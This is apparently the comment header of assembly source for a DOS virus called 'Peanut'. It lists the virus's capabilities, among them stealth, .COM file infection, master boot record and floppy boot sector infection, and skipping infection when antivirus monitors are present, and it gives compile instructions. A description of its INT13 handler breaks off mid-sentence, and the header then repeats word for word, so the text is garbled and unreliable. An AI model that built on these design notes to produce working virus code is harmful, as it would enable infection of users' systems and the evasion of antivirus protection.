;       Virus Name:  Peanut
; Effective Length:  445 Bytes
;
;            Notes:  
;                  - resident, stealth, multipartite, appending .COM infector
;                  - infects .COM files when they are executed
;                  - preserves host file's date/time stamp
;                  - I/O error messages trapped by virus int24 handler 
;                  - infects fixed disk MBR
;                  - post-infection MBR write protection
;                  - infects boot sectors of all floppy formats on all drives
;                  - MBR/floppy boot sector stealth
;                  - boot sector infection not attempted when TSR A-V monitor
;                    is present
;                  - virus fits into a single boot or MBR sector
;
;       To Compile:
;                  - use A86 assembler
;                  - type "a86 peanut.a86"

; INT13 Handler - steals int21 upon execution of first .EXE file to avoid 
; problems on systems which load DOS high, provides MBR stealth/write protect,
; infects floppies except when TSR A-V monitoring program is present and 
; provides floppy stealth by zeroing out the virus code in the disk I/O buffer 
; containing the infected boot sector.  Original floppy boot sector is not 
; relocated, system simply boots from hard drive after boot from an infected 
; floppy.  This is VERY easy to miss if the boot from floppy is unintentional,

;       Virus Name:  Peanut
; Effective Length:  445 Bytes
;
;            Notes:  
;                  - resident, stealth, multipartite, appending .COM infector
;                  - infects .COM files when they are executed
;                  - preserves host file's date/time stamp
;                  - I/O error messages trapped by virus int24 handler 
;                  - infects fixed disk MBR
;                  - post-infection MBR write protection
;                  - infects boot sectors of all floppy formats on all drives
;                  - MBR/floppy boot sector stealth
;                  - boot sector infection not attempted when TSR A-V monitor
;                    is present
;                  - virus fits into a single boot or MBR sector
;
;       To Compile:
;                  - use A86 assembler
;                  - type "a86 peanut.a86"
